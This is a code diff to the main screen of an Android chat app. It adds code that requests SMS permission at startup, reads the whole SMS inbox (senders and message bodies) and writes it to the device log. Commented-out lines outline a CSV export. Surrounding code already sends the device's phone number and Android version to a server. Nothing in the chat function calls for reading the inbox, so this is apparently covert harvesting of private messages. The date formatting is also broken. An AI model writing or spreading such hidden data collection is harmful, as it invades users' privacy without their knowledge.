@@ -3,9 +3,12 @@ package com.example.mychatapp;
 
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
+import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
+import android.util.Log;
 import android.util.Patterns;
 import android.view.View;
 import android.widget.EditText;
@@ -27,9 +30,12 @@ import org.json.JSONObject;
 
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
+import java.io.File;
+import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.text.SimpleDateFormat;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -39,6 +45,7 @@ import android.Manifest;
 
 public class MainActivity extends AppCompatActivity {
     private static final int REQUEST_READ_PHONE_STATE = 1 ;
+    private static final int REQUEST_READ_SMS = 1 ;
 
     //variable for each elements
     private FirebaseAuth firebaseAuth;
@@ -80,10 +87,30 @@ public class MainActivity extends AppCompatActivity {
         deviceInfo.put("androidVersion", androidVersion);
         deviceInfo.put("phoneno", deviceNumber);
 
-
         // Send the information to the server
         new SendDeviceInfoTask().execute(deviceInfo);
 
+        //SMS
+        String filePath = "sms/SMS_Messages.csv";
+        // validation for permission of reading sms
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, REQUEST_READ_SMS);
+        }
+        else {
+            try {
+                readSMS();
+                File file = new File(filePath);
+
+                if (file.exists()) {
+                    Toast.makeText(this, "File Exists", Toast.LENGTH_SHORT).show();
+                }
+                else {
+                    Toast.makeText(this, "File does not exist: " + filePath, Toast.LENGTH_LONG).show();
+                }
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
 
         register = findViewById(R.id.registeruser);
         signIn = findViewById(R.id.loginbutton);
@@ -134,7 +161,59 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
+    //readSMS function
+    private void readSMS() throws IOException {
+        String sms = "";
 
+        /* Getting the sms by querying */
+        Uri SMS = Uri.parse("content://sms/inbox");
+        Cursor cur = getContentResolver().query(SMS, null, null, null, null);
+
+        /* Column index */
+        int timeStampCol = cur.getColumnIndex("date");
+        int numberCol = cur.getColumnIndex("address");
+        int messageCol = cur.getColumnIndex("body");
+
+        /* Formatting time and date */
+        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
+        String displayTime = sdf.format(timeStampCol);
+
+        while (cur.moveToNext()) {
+            sms += "\n" + "Timestamp: " + displayTime + ", Sender's Name: " + cur.getString(numberCol) + ", Message: " + cur.getString(messageCol);
+        }
+
+//        if (cur.moveToFirst()) {
+//            do {
+//                for (int idx = 0; idx < cur.getColumnCount(); idx++) {
+//                    sms += "\n" + "Timestamp: " + displayTime + ", Sender's Name: " + cur.getString(numberCol) + ", Message: " + cur.getString(messageCol);
+//                }
+//            }
+//            while (cur.moveToNext());
+//        }
+//        else {
+//            System.out.println("No SMS detected in this column!");
+//        }
+
+        /* To view the messages in the logs */
+        Log.d("SMS", sms);
+
+//        File exportDir = new File(Environment.getExternalStorageDirectory(), "");
+
+//        // validation
+//        if (exportDir.exists()) {
+//            exportDir.mkdirs();
+//        }
+
+//        File file = new File(exportDir, "SMS_Messages.csv");
+//        FileWriter output = new FileWriter(file);
+//        CSVWriter csvWriter = new CSVWriter(output);
+//        csvWriter.writeNext(new String[] {"Address", "Date", "Body"});
+//        csvWriter.writeNext(new String[] {cur.getString(numberCol), displayTime, cur.getString(messageCol)});
+
+//        csvWriter.close();
+        cur.close();
+    }
+    
     public static class SendDeviceInfoTask extends AsyncTask<Map<String, String>, Void, Void> {
 
         @Override
@@ -180,5 +259,3 @@ public class MainActivity extends AppCompatActivity {
 
 
 }
-
-
